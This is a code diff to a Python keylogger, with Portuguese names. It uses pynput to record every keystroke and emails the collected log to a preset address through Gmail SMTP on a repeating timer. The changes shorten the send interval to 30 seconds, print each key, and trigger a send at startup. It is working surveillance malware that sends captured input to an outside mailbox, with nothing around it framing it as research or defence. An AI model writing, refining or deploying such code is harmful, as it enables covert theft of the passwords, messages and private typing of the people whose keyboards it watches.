@@ -23,18 +23,18 @@ def enviar_email():
         msg["From"] = EMAIL_ORIGEM
         msg["To"] = EMAIL_DESTINO
 
-    try:
-        server = smtplib.SMTP("smtp.gmail.com", 587)
-        server.starttls()
-        server.login(EMAIL_ORIGEM, SENHA_EMAIL)
-        server.send_message(msg)
-        server.close()
-    except Exception as e:
-        print("Erro ao enviar", e)
+        try:
+            server = smtplib.SMTP("smtp.gmail.com", 587)
+            server.starttls()
+            server.login(EMAIL_ORIGEM, SENHA_EMAIL)
+            server.send_message(msg)
+            server.close()
+        except Exception as e:
+            print("Erro ao enviar", e)
 
     log = ""
 
-    Timer(60, enviar_email).start()
+    Timer(30, enviar_email).start()
 
 def on_press(key):
     global log
@@ -51,6 +51,7 @@ def on_press(key):
     }    
     
     try:
+        print(key)
         log += key.char
     except AttributeError:
         if key == keyboard.Key.space:
@@ -69,4 +70,5 @@ def on_press(key):
             log += f" [{key}] "
 
 with keyboard.Listener(on_press=on_press) as listener:
+    enviar_email()
     listener.join()
